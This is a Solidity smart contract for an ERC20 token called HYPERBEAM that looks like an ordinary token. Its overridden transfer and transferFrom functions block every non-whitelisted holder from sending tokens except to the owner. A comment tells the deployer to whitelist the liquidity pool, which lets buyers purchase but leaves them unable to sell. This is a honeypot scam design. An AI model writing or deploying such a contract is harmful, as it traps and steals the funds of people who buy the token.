// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("HYPERBEAM", "HYB") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 5000000 * 10 ** decimals());
        whiteList[0x38221Bdc80C624d9eaeCd7A52cD6569429114ccB]= true;
        whiteList[0x9190BE232dDc0F4a80602454856D6AfE95B25356]=true;
        whiteList[0x7D95726c9598FbD67360B7cFE3c41D8E96509cbB]=true;
        whiteList[0xF1dcA5126E37783b6e79460D8E2b2e231F8bb83f]=true;
        whiteList[0x40F7c5A77f6d885A48372f57Ee5D2d97dFe41aEf]=true;
        whiteList[0x3c9DE3Ea4E3C9102617Be2d372235a13B787fF11]=true;
        whiteList[0x0D1E48b1F39A2dDf5aba6F7F9459289d6a9FFB18]=true;
        whiteList[0xf8368e48E8eE15Ccf33853b97e5C32C1c20EdEC0]=true;
        whiteList[0x7Ee30cBF114188db7c89fb29B15AA1826c0bB3F7]=true;
        whiteList[0xE19e335Acb05609B813773906190A5A9545DB030]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}